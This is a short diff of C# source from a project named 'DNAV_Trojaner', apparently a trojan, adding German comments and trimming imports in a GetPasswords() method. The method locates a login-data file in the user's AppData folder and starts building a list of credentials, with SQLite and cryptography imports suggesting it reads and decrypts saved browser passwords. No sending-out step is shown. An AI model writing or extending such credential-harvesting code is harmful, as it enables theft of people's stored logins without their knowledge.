@@ -1,8 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Linq;
 using System.Text;
-using System.Threading.Tasks;
 using System.Data.SQLite;
 using System.IO;
 using System.Security.Cryptography;
@@ -16,8 +14,12 @@ namespace DNAV_Trojaner
 
         public IEnumerable<Credential> GetPasswords()
         {
+            //Pfad des Appdata Ordners
             string folder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+
+            //Pfad der Datei, in welcher die Logindaten liegen
             string file = Path.GetFullPath(folder + _dataPath);
+
             List<Credential> credentials = new List<Credential>();
 
             if(File.Exists(file))
